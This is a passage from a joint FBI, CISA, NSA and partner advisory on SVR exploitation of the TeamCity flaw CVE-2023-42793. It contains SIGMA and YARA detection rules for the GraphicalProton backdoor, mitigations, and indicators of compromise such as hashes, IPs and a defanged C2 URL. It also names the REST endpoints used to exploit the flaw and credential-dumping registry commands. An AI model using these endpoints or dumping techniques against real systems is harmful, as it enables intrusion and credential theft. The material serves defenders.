+  "text": "Exfiltration Over C2 Channel          T1041                  SVR cyber actors may steal data\n                                                                        by exfiltrating it over an existing C2\n                                                                        channel. Stolen data is encoded\n                                                                        into normal communications using\n                                                                        the same protocol as C2\n                                                                        communications."
+ },
+ {
+  "id": "p88",
+  "text": "Exfiltration Over Web Service          T1567                   SVR cyber actors use OneDrive\n                                                                          and Dropbox to exfiltrate data to\n                                                                          their C2 station."
+ },
+ {
+  "id": "p89",
+  "text": "INDICATORS OF COMPROMISE\n       Note: Please refer to Appendix B for a list of IOCs."
+ },
+ {
+  "id": "p90",
+  "text": "VICTIM TYPES\n       As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC\n       have identified a few dozen compromised companies in the United States, Europe, Asia, and\n       Australia, and are aware of over a hundred compromised devices though we assess this list does not\n       represent the full set of compromised organizations. Generally, the victim types do not fit into any sort\n       of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server,\n       leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in\n       nature and not necessarily a targeted attack. Identified victims included: an energy trade association;\n       companies that provide software for billing, medical devices, customer care, employee monitoring,\n       financial management, marketing, sales, and video games; as well as hosting companies, tools\n       manufacturers, and small and large IT companies."
+ },
+ {
+  "id": "p91",
+  "text": "Detection Methods\n       The following rules can be used to detect activity linked to adversary activity. These rules should\n       serve as examples and adapt to each organization’s environment and telemetry.\n       SIGMA rules\n       Presented SIGMA rules target identified operators’ behavior patterns and can be used for the threat\n       hunting against collected logs."
+ },
+ {
+  "id": "p92",
+  "text": "title: Privilege information listing via whoami\n       description: Detects whoami.exe execution and listing of privileges\n       author:\n       references: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               Image|endswith:\n                  - 'whoami.exe'\n               CommandLine|contains:\n                  - 'priv'\n                  - 'PRIV'\n           condition: selection\n       falsepositives: legitimate use by system administrator"
+ },
+ {
+  "id": "p93",
+  "text": "title: DC listing via nltest\n       description: Detects nltest.exe execution and DC listing"
+ },
+ {
+  "id": "p94",
+  "text": "author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               Image|endswith:\n                  - 'nltest.exe'\n               CommandLine|re: '.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'\n           condition: selection\n       falsepositives: legitimate use by system administrator"
+ },
+ {
+  "id": "p95",
+  "text": "title: DLL execution via WMI\n       description: Detects DLL execution via WMI\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               Image|endswith:\n                  - 'WMIC.exe'\n               CommandLine|contains|all:\n                  - 'call'\n                  - 'rundll32'\n           condition: selection\n       falsepositives: legitimate use by software or system administrator"
+ },
+ {
+  "id": "p96",
+  "text": "title: Process with connect and pass as args\n       description: Process with connect and pass as args\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               CommandLine|contains|all:\n                  - 'pass'\n                  - 'connect'\n           condition: selection\n       falsepositives: legitimate use of rsockstun or software with exact same arguments"
+ },
+ {
+  "id": "p97",
+  "text": "title: Service or Drive enumeration via powershell\n       description: Service or Drive enumeration via powershell\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: ps_script\n           product: windows\n       detection:\n           selection_1:\n                   ScriptBlockText|contains|all:\n                   - 'Get-WmiObject'\n                   - '-Class'"
+ },
+ {
+  "id": "p98",
+  "text": "- 'Win32_Service'\n           selection_2:\n                   ScriptBlockText|contains|all:\n                   - 'Get-WindowsDriver'\n                   - '-Online'\n                   - '-All'\n           condition: selection_1 or selection_2\n       falsepositives: legitimate use by system administrator"
+ },
+ {
+  "id": "p99",
+  "text": "title: Compressing files from temp to temp\n       description: Compressing files from temp\\ to temp used by SVR to prepare data to be exfiltrated\n       references:\n       author:\n       date: 2023/11/15\n       logsource:\n           category: ps_script\n           product: windows\n       detection:\n           selection:\n               ScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1-\n       9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'\n           condition: selection"
+ },
+ {
+  "id": "p100",
+  "text": "title: DLL names used by SVR for GraphicalProton backdoor\n       description: Hunts for known SVR-specific DLL names.\n       references:\n       author:\n       date: 2023/11/15\n       logsource:\n           category: image_load\n           product: windows\n       detection:\n           selection:\n               ImageLoaded|endswith:\n                  - 'AclNumsInvertHost.dll'\n                  - 'ModeBitmapNumericAnimate.dll'\n                  - 'UnregisterAncestorAppendAuto.dll'\n                  - 'DeregisterSeekUsers.dll'\n                  - 'ScrollbarHandleGet.dll'\n                  - 'PerformanceCaptionApi.dll'\n                  - 'WowIcmpRemoveReg.dll'\n                  - 'BlendMonitorStringBuild.dll'\n                  - 'HandleFrequencyAll.dll'\n                  - 'HardSwapColor.dll'\n                  - 'LengthInMemoryActivate.dll'\n                  - 'ParametersNamesPopup.dll'\n                  - 'ModeFolderSignMove.dll'\n                  - 'ChildPaletteConnected.dll'\n                  - 'AddressResourcesSpec.dll'\n           condition: selection"
+ },
+ {
+  "id": "p101",
+  "text": "title: Sensitive registry entries saved to file\n       description: Sensitive registry entries saved to file\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection_base:\n               Image|endswith:\n                  - 'reg.exe'\n               CommandLine|contains: 'save'\n               CommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'"
+ },
+ {
+  "id": "p102",
+  "text": "selection_file:\n             CommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'\n           condition: selection_base and selection_file"
+ },
+ {
+  "id": "p103",
+  "text": "title: Scheduled tasks names used by SVR for GraphicalProton backdoor\n       description: Hunts for known SVR-specific scheduled task names\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: taskscheduler\n           product: windows\n       detection:\n           selection:\n               EventID:\n                  - 4698\n                  - 4699\n                  - 4702\n               TaskName:\n                  - '\\Microsoft\\Windows\\IISUpdateService'\n                  - '\\Microsoft\\Windows\\WindowsDefenderService'\n                  - '\\Microsoft\\Windows\\WindowsDefenderService2'\n                  - '\\Microsoft\\DefenderService'\n                  - '\\Microsoft\\Windows\\DefenderUPDService'\n                  - '\\Microsoft\\Windows\\WiMSDFS'\n                  - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'\n                  - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'\n                  - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'\n                  - '\\WindowUpdate'\n                  - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'\n                  - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'\n                  - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'\n                  - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'\n                  - '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'\n                  - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n                  - '\\Microsoft\\Windows\\ATPUpd'\n                  - '\\Microsoft\\Windows\\Windows Defender\\Service Update'\n                  - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'\n                  - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n                  - '\\Defender'\n                  - '\\defender'\n                  - '\\\\Microsoft\\\\Windows\\\\IISUpdateService'\n                  - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'\n                  - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'\n                  - '\\\\Microsoft\\\\DefenderService'\n                  - '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'\n                  - '\\\\Microsoft\\\\Windows\\\\WiMSDFS'\n                  - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'\n                  - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'\n                  - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'\n                  - '\\\\WindowUpdate'\n                  - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'\n                  - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'\n                  - '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'\n                  - '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'\n                  - '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'\n                  - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n                  - '\\\\Microsoft\\\\Windows\\\\ATPUpd'\n                  - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'\n                  - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'\n                  - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n                  - '\\\\Defender'\n                  - '\\\\defender'\n           condition: selection"
+ },
+ {
+  "id": "p104",
+  "text": "title: Scheduled tasks names used by SVR for GraphicalProton backdoor\n       description: Hunts for known SVR-specific scheduled task names\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               Image|endswith:\n                  - 'schtasks.exe'\n               CommandLine|contains:\n                  - 'IISUpdateService'\n                  - 'WindowsDefenderService'\n                  - 'WindowsDefenderService2'\n                  - 'DefenderService'\n                  - 'DefenderUPDService'\n                  - 'WiMSDFS'\n                  - 'StartupAppTaskCkeck'\n                  - 'SubmitReporting'\n                  - 'Defender Update Service'\n                  - 'WindowUpdate'\n                  - 'CheckReporting'\n                  - 'StartupAppTaskCheck'\n                  - 'SpeechModelInstallTask'\n                  - 'BfeOnServiceStart'\n                  - 'Data Integrity Update'\n                  - 'Scheduled AutoCheck'\n                  - 'ATPUpd'\n                  - 'Service Update'\n                  - 'Scheduled Check'\n                  - 'Scheduled AutoCheck'\n                  - 'Defender'\n                  - 'defender'\n           selection_re:\n               Image|endswith:\n                  - 'schtasks.exe'\n               CommandLine|re:\n                  - '.*Defender\\sUpdate\\sService.*'\n                  - '.*Data\\sIntegrity\\sUpdate.*'\n                  - '.*Scheduled\\sAutoCheck.*'\n                  - '.*Service\\sUpdate.*'\n                  - '.*Scheduled\\sCheck.*'\n                  - '.*Scheduled\\sAutoCheck.*'\n           condition: selection or selection_re"
+ },
+ {
+  "id": "p105",
+  "text": "title: Suspicious registry modifications\n       description: Suspicious registry modifications\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: registry_set\n           product: windows\n       detection:\n           selection:\n               EventID: 4657\n               TargetObject|contains:\n                  - 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'\n                  - 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLmHash'\n           condition: selection"
+ },
+ {
+  "id": "p106",
+  "text": "title: Registry modification from cmd\n       description: Registry modification from cmd\n       author:\n       references:\n       date: 2023/11/15\n       logsource:\n           category: process_creation\n           product: windows\n       detection:\n           selection:\n               Image|endswith:\n                  - 'reg.exe'\n               CommandLine|contains|all:\n                  - 'CurrentControlSet'\n                  - 'Lsa'\n               CommandLine|contains:\n                  - 'DisableRestrictedAdmin'\n                  - 'NoLmHash'\n           condition: selection"
+ },
+ {
+  "id": "p107",
+  "text": "title: Malicious Driver Load\n       description: Detects the load of known malicious drivers via their names or hash.\n       references:\n           - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection\n       author:\n       date: 2023/11/15\n       logsource:\n           category: driver_load\n           product: windows\n       detection:\n           selection_name:\n               ImageLoaded|endswith:\n                   - 'RTCore64.sys'\n                   - 'DBUtils_2_3.sys'\n           selection_hash:\n               Hashes|contains:\n                   - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'\n                   - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'\n           condition: selection_name or selection_hash"
+ },
+ {
+  "id": "p108",
+  "text": "YARA rules\n       Following rule detects most known GraphicalProton variants\n       rule APT29_GraphicalProton {\n          strings:\n             // C1 E9 1B                      shr ecx, 1Bh\n             // 48 8B 44 24 08                  mov rax, [rsp+30h+var_28]\n             // 8B 50 04                     mov edx, [rax+4]\n             // C1 E2 05                     shl edx, 5\n             // 09 D1                      or     ecx, edx\n             // 48 8B 44 24 08                  mov rax, [rsp+30h+var_28]\n             $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }"
+ },
+ {
+  "id": "p109",
+  "text": "// 48 05 20 00 00 00                add rax, 20h ; ' '\n            // 48 89 C1                       mov rcx, rax\n            // 48 8D 15 0A A6 0D 00                lea rdx, unk_14011E546\n            // 41 B8 30 00 00 00                mov r8d, 30h ; '0'\n            // E8 69 B5 FE FF                   call sub_14002F4B0\n            // 48 8B 44 24 30                  mov rax, [rsp+88h+var_58]\n            // 48 05 40 00 00 00                add rax, 40h ; '@'\n            // 48 89 C1                       mov rcx, rax\n            // 48 8D 15 1B A6 0D 00                lea rdx, unk_14011E577"
+ },
+ {
+  "id": "p110",
+  "text": "// 41 B8 70 01 00 00               mov r8d, 170h\n             // E8 49 B5 FE FF                 call sub_14002F4B0\n             // 48 8B 44 24 30                mov rax, [rsp+88h+var_58]\n             // 48 05 60 00 00 00              add rax, 60h ; '`'\n             // 48 89 C1                    mov rcx, rax\n             // 48 8D 15 6C A7 0D 00               lea rdx, unk_14011E6E8\n             // 41 B8 2F 00 00 00               mov r8d, 2Fh ; '/'\n             // E8 29 B5 FE FF                 call sub_14002F4B0\n             // 48 8B 44 24 30                mov rax, [rsp+88h+var_58]\n             // 48 05 80 00 00 00              add rax, 80h\n             // 48 89 C1                    mov rcx, rax\n             // 48 8D 15 7C A7 0D 00               lea rdx, unk_14011E718\n             // 41 B8 2F 00 00 00               mov r8d, 2Fh ; '/'\n             // E8 09 B5 FE FF                 call sub_14002F4B0\n             // 48 8B 44 24 30                mov rax, [rsp+88h+var_58]\n             // 48 05 A0 00 00 00               add rax, 0A0h\n             $op_decrypt_config = {\n                 48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n                 48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n                 48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n                 48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n                 48 05 A0 00 00 00\n             }"
+ },
+ {
+  "id": "p111",
+  "text": "condition:\n             all of them\n       }"
+ },
+ {
+  "id": "p112",
+  "text": "Note: These rules are meant for threat hunting and have not been tested on a larger dataset."
+ },
+ {
+  "id": "p113",
+  "text": "MITIGATION\n       The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of\n       this campaign poses a threat to public safety and recommend organizations implement the mitigations\n       below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector\n       Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards\n       and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and\n       NIST recommend all organizations implement. CISA and NIST based the CPGs on existing\n       cybersecurity frameworks and guidance to protect against the most common and impactful threats,\n       tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for\n       more information on the CPGs, including additional recommended baseline protections.\n             •    Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-\n                  September 2023, if not already completed.\n             •    Monitor the network for evidence of encoded commands and execution of network scanning\n                  tools.\n             •    Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if\n                  monitoring or reporting is disabled, or if communication is lost with a host agent for more than a\n                  reasonable amount of time.\n             •    Require use of multi-factor authentication [CPG 1.3] for all services to the extent possible,\n                  particularly for email, virtual private networks, and accounts that access critical systems.\n                              ▪ Organizations should adopt multi-factor authentication (MFA) as an additional\n                                   layer of security for all users with access to sensitive data. Enabling MFA\n                                   significantly reduces the risk of unauthorized access, even if passwords are\n                                   compromised.\n             •    Keep all operating systems, software, and firmware up to date. Immediately configure\n                  newly-added systems to the network, including those used for testing or development work, to\n                  follow the organization’s security baseline and incorporate into enterprise monitoring tools."
+ },
+ {
+  "id": "p114",
+  "text": "•    Audit log files to identify attempts to access privileged certificates and creation of fake identity\n                providers.\n           •    Deploy software to identify suspicious behavior on systems.\n           •    Deploy endpoint protection systems with the ability to monitor for behavioral indicators of\n                compromise.\n           •    Use available public resources to identify credential abuse with cloud environments.\n           •    Configure authentication mechanisms to confirm certain user activities on systems, including\n                registering new devices."
+ },
+ {
+  "id": "p115",
+  "text": "VALIDATE SECURITY CONTROLS\n       In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend\n       exercising, testing, and validating your organization's security program against the threat behaviors\n       mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW,\n       CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how\n       they perform against the ATT&CK techniques described in this advisory.\n       To get started:\n           1. Select an ATT&CK technique described in this advisory (see previous tables).\n           2. Align your security technologies against the technique.\n           3. Test your technologies against the technique.\n           4. Analyze your detection and prevention technologies’ performance.\n           5. Repeat the process for all security technologies to obtain a set of comprehensive performance\n               data.\n           6. Tune your security program, including people, processes, and technologies, based on the\n               data generated by this process.\n       FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security\n       program, at scale, in a production environment to ensure optimal performance against the MITRE\n       ATT&CK techniques identified in this advisory."
+ },
+ {
+  "id": "p116",
+  "text": "REFERENCES\n       • FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber\n       Operations: Trends and Best Practices for Network Defenders\n       • NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks\n       • CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise\n       • CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud\n       Environments\n       • CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies,\n       Critical Infrastructure, and Private Sector Organizations\n       • CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity\n       • FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think\n       Tanks\n       • CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development\n       • NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development\n       The information in this report is being provided “as is” for informational purposes only. FBI, CISA,\n       NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or"
+ },
+ {
+  "id": "p117",
+  "text": "service, including any entities, products, or services linked within this document. Any reference to\n       specific commercial entities, products, processes, or services by service mark, trademark,\n       manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring\n       by FBI, CISA, NSA, SKW, CERT Polska, and NCSC."
+ },
+ {
+  "id": "p118",
+  "text": "VERSION HISTORY\n       12 December 2023"
+ },
+ {
+  "id": "p119",
+  "text": "APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793\n       On a Windows system, the log file C:\\TeamCity\\logs\\teamcity-server.log will contain a log\n       message when an attacker modified the internal.properties file. There will also be a log message\n       for every process created via the /app/rest/debug/processes endpoint. In addition to showing the\n       command line used, the user ID of the user account whose authentication token was used during the\n       attack is also shown. For example:\n       [2023-09-26 11:53:46,970]   INFO - ntrollers.FileBrowseController - File\n       edited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by\n       user with id=1\n       [2023-09-26 11:53:46,970]   INFO - s.buildServer.ACTIVITIES.AUDIT -\n       server_file_change: File\n       C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified\n       by \"user with id=1\"\n       [2023-09-26 11:53:58,227]   INFO - tbrains.buildServer.ACTIVITIES -\n       External process is launched by user user with id=1. Command line: cmd.exe\n       \"/c whoami\"\n       An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity\n       logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP\n       proxy may have suitable logs showing the following target endpoints being accessed:"
+ },
+ {
+  "id": "p120",
+  "text": "•    /app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.\n           •    /app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary\n                user.\n           •    /app/rest/debug/processes – This endpoint is only required if the attacker wishes to create\n                an arbitrary process."
+ },
+ {
+  "id": "p121",
+  "text": "Note: The user ID value may be higher than 1."
+ },
+ {
+  "id": "p122",
+  "text": "APPENDIX B – IOCS\n       File IoCs\n       GraphicalProton backdoor:\n       ▪   01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732\n       ▪   34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E\n       ▪   620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869\n       ▪   773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13\n       ▪   7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53\n       ▪   8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7\n       ▪   971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC\n       ▪   CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n       ▪   CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43\n       ▪   EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E\n       ▪   F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB\n       ▪   C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4\n       ▪   4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166"
+ },
+ {
+  "id": "p123",
+  "text": "GraphicalProton HTTPS backdoor:\n       ▪   18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93\n       ▪   19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641\n       ▪   1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8\n       ▪   219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67\n       ▪   92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6\n       ▪   B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7\n       ▪   C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD\n       ▪   C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0\n       ▪   C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3\n       ▪   F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69"
+ },
+ {
+  "id": "p124",
+  "text": "Backdoored vcperf\n       ▪   D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443"
+ },
+ {
+  "id": "p125",
+  "text": "Backdoored Zabbix installation archive:\n       ▪   4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F"
+ },
+ {
+  "id": "p126",
+  "text": "Backdoored Webroot AV installation archive:\n       ▪   950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4"
+ },
+ {
+  "id": "p127",
+  "text": "Modified rsockstun"
+ },
+ {
+  "id": "p128",
+  "text": "▪   CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF"
+ },
+ {
+  "id": "p129",
+  "text": "Network IoCs"
+ },
+ {
+  "id": "p130",
+  "text": "Tunnel endpoints\n       ▪   65.20.97.203\n       ▪   65.21.51.58"
+ },
+ {
+  "id": "p131",
+  "text": "Exploitation server\n       ▪   103.76.128.34"
+ },
+ {
+  "id": "p132",
+  "text": "GraphicalProton HTTPS C2 URL:\n       HXXPS://MATCLICK[.]COM/WP-QUERY[.]PHP"
+ }
+]
